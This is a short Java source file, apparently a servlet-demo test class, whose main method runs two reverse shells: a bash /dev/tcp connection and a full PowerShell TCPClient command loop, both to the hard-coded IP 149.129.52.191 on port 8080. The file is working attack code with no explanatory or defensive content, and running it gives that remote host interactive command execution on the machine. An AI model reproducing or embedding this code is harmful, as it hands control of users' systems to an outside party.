package com.example.servletdemo;

import java.io.IOException;

/**
 * @author : Walker
 * @date : Created in 2022/5/23 12:37 PM
 * @description:
 */
public class test11111 {
    public static void main(String[] args) throws IOException {
        Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "bash -c 'exec bash -i &>/dev/tcp/149.129.52.191/8080 <&1'"});
        Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('149.129.52.191',8080);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\""});
    }
}
